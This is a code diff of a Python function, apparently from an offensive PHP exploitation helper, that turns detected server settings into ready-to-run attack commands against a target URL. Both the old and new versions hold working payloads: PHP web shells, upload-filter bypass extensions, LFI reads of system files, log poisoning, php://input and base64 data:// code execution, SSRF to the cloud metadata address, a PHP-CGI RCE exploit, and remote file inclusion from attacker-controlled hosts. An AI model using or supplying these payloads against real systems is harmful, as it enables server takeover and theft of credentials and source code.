@@ -361,72 +361,99 @@ def generate_config_attack_mapping(config):
 
 def generate_exploitation_suggestions(config, streams, target_url):
     """
-    Generate focused exploitation suggestions with improved formatting.
+    Generate focused exploitation suggestions ordered by likelihood of success and impact.
+    Order priority:
+    1. File Upload (direct code execution)
+    2. LFI/File Stream (reliable, common)
+    3. PHP Stream attacks (if available)
+    4. Data Stream (requires specific conditions)
+    5. SSRF (environment dependent)
+    6. Compression attacks (more complex)
+    7. FTP (requires external setup)
     """
     suggestions = []
 
-    # 1. LFI Tests
-    if (config.get("allow_url_fopen", "").lower() == "on" or 
-        config.get("open_basedir", "").lower() in ["", "no value", "none"]):
-        suggestions.append(f"\n{Fore.MAGENTA}[+] LFI VECTORS{Style.RESET_ALL}")
-        suggestions.append(f"{Fore.YELLOW}Basic LFI Tests:{Style.RESET_ALL}")
+    # 1. File Upload (if enabled) - Most direct path to RCE
+    if config.get("file_uploads", "").lower() == "on":
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}[+] FILE UPLOAD ATTACKS{Style.RESET_ALL}")
+        suggestions.append("1. Prepare shell.php:")
+        suggestions.append("     <?php system($_GET['cmd']); ?>")
+        suggestions.append("")
+        suggestions.append("2. Try these extensions:")
+        suggestions.append("     .php, .php.jpg, .php;.jpg, .php%00.jpg, .phtml")
+        suggestions.append("")
+        suggestions.append("3. Upload attempts:")
+        max_size = config.get("upload_max_filesize", "2M")
+        suggestions.append(f"     curl -F 'file=@shell.php' -F 'submit=1' '{target_url}'")
+        suggestions.append(f"     # Ensure file size is under found Max File Size: {max_size}")
+        suggestions.append("")
+
+    # 2. File Stream/LFI - Very common, often successful
+    if "file" in streams:
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}[+] FILE STREAM/LFI ATTACKS{Style.RESET_ALL}")
+        suggestions.append("Basic LFI Tests:")
         suggestions.append(f"  curl '{target_url}?page=../../../etc/passwd'")
         suggestions.append(f"  curl '{target_url}?page=../../../proc/self/environ'")
+        suggestions.append("")
         
-        if "php" in streams:
-            suggestions.append("\n    PHP Filter LFI:")
-            suggestions.append(f"    curl '{target_url}?page=php://filter/convert.base64-encode/resource=index.php'")
-            suggestions.append(f"    curl '{target_url}?page=php://filter/convert.base64-encode/resource=config.php'")
-        
-        suggestions.append("\n    Log Poisoning:")
-        suggestions.append(f"    curl '{target_url}' -H '<?php system($_GET[\"cmd\"]); ?>'")
-        suggestions.append(f"    curl '{target_url}?page=../../../var/log/apache2/access.log&cmd=id'")
+        # If we have file uploads, combine with LFI
+        if config.get("file_uploads", "").lower() == "on":
+            suggestions.append("LFI + Upload Chain:")
+            upload_path = config.get("upload_tmp_dir", "/tmp")
+            suggestions.append(f"  curl '{target_url}?page={upload_path}/shell.php&cmd=id'")
+            suggestions.append("")
 
-    # 2. RFI Tests - If Enabled
-    if config.get("allow_url_include", "").lower() == "on":
-        suggestions.append(f"\n{Fore.MAGENTA}RFI Tests:{Style.RESET_ALL}")
-        suggestions.append("    Host this file on your server (shell.php):")
-        suggestions.append("    <?php system($_GET['cmd']); ?>")
-        suggestions.append("\n    Then try:")
-        suggestions.append(f"    curl '{target_url}?page=http://YOUR-IP/shell.php&cmd=id'")
-        
-        if "data" in streams:
-            suggestions.append("\n    Data Wrapper RFI:")
-            suggestions.append(f"    curl '{target_url}?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&cmd=id'")
+    # 3. PHP Stream Attacks - If specific wrappers available
+    if "php" in streams:
+        if "filter" in streams:
+            suggestions.append(f"{Fore.LIGHTCYAN_EX}[+] PHP FILTER ATTACKS{Style.RESET_ALL}")
+            suggestions.append("Source Code Disclosure:")
+            suggestions.append(f"  curl '{target_url}?page=php://filter/convert.base64-encode/resource=index.php'")
+            suggestions.append(f"  curl '{target_url}?page=php://filter/convert.base64-encode/resource=config.php'")
+            suggestions.append("")
 
-    # 3. File Upload + LFI Chain
-    if config.get("file_uploads", "").lower() == "on":
-        suggestions.append(f"\n{Fore.MAGENTA}File Upload + LFI Chain:{Style.RESET_ALL}")
-        suggestions.append("    1. Create shell.php:")
-        suggestions.append("    <?php system($_GET['cmd']); ?>")
-        suggestions.append("\n    2. Try uploading with different extensions:")
-        suggestions.append("    .php, .php.jpg, .php;.jpg, .php%00.jpg, .php.jpeg, .php5, .phtml")
-        suggestions.append("\n    3. If upload successful, try including via LFI:")
-        upload_path = config.get("upload_tmp_dir", "/tmp")
-        suggestions.append(f"    curl '{target_url}?page={upload_path}/shell.php&cmd=id'")
+        if "input" in streams:
+            suggestions.append("PHP Input Stream:")
+            suggestions.append(f"  curl '{target_url}?page=php://input' -d '<?php system(\"id\"); ?>'")
+            suggestions.append("")
 
-    # 4. PHP Object Injection (if vulnerable version detected)
-    if "phar" in streams and any(v in config.get("PHP_Version", "") for v in ["5.", "7.0", "7.1"]):
-        suggestions.append(f"\n{Fore.MAGENTA}PHP Object Injection via PHAR:{Style.RESET_ALL}")
-        suggestions.append("    1. Create malicious PHAR file with PHPGGC")
-        suggestions.append("    2. Upload it with image extension (exploit.jpg)")
-        suggestions.append(f"    3. curl '{target_url}?page=phar://path/to/uploads/exploit.jpg'")
+    # 4. Data Stream - Requires proper configuration
+    if "data" in streams:
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}[+] DATA STREAM ATTACKS{Style.RESET_ALL}")
+        suggestions.append("Code Execution via Data Stream:")
+        suggestions.append(f"  curl '{target_url}?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B'")
+        suggestions.append("")
 
-    # 5. Command Injection (if dangerous functions enabled)
-    if config.get("disable_functions", "").lower() in ["", "no value"]:
-        suggestions.append(f"\n{Fore.MAGENTA}Command Injection Tests:{Style.RESET_ALL}")
-        suggestions.append("    Try these PHP functions:")
-        suggestions.append("    system(), exec(), shell_exec(), passthru()")
-        suggestions.append("\n    Example payloads:")
-        suggestions.append(f"    curl '{target_url}?cmd=system(\"id\");'")
-        suggestions.append(f"    curl '{target_url}' --data 'cmd=passthru(\"id\");'")
+    # 5. SSRF - Environment dependent
+    if any(s in streams for s in ["http", "https"]):
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}[+] SSRF ATTACKS{Style.RESET_ALL}")
+        suggestions.append("Internal Service Discovery:")
+        suggestions.append(f"  curl '{target_url}?page=http://localhost/internal-endpoint'")
+        suggestions.append(f"  curl '{target_url}?page=https://169.254.169.254/latest/meta-data/'")
+        suggestions.append("")
 
-    # 6. CGI/FastCGI RCE (if detected)
-    if config.get("Server_API", "").lower().startswith(("cgi", "fast")):
-        suggestions.append(f"\n{Fore.MAGENTA}CGI/FastCGI RCE:{Style.RESET_ALL}")
-        suggestions.append("    Try PHP-CGI RCE (CVE-2012-1823):")
-        suggestions.append(f"    curl '{target_url}?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' -d '<?php system(\"id\"); ?>'")
-        suggestions.append(f"    curl '{target_url}?-s' # Source code disclosure")
+    # 6. Compression Attacks - More complex, specific conditions
+    if any(s in streams for s in ["zip", "compress.zlib", "compress.bzip2"]):
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}[+] COMPRESSION ATTACKS{Style.RESET_ALL}")
+        suggestions.append("Zip/Compression Wrapper:")
+        suggestions.append("  1. Create payload:")
+        suggestions.append("     zip payload.zip shell.php")
+        suggestions.append(f"  2. Include: curl '{target_url}?page=zip://payload.zip%23shell.php'")
+        suggestions.append("")
+
+    # 7. FTP - Requires external setup, less reliable
+    if any(s in streams for s in ["ftp", "ftps"]):
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}[+] FTP ATTACKS{Style.RESET_ALL}")
+        suggestions.append("FTP Inclusion (requires setup):")
+        suggestions.append("  1. Start FTP server:")
+        suggestions.append("     python3 -m pyftpdlib -p 21")
+        suggestions.append("")
+        suggestions.append("  2. Host malicious file:")
+        suggestions.append("     echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php")
+        suggestions.append("")
+        suggestions.append("  3. Test inclusion:")
+        suggestions.append(f"     curl '{target_url}?page=ftp://attacker.com/shell.php'")
+        suggestions.append("")
 
     return suggestions
 
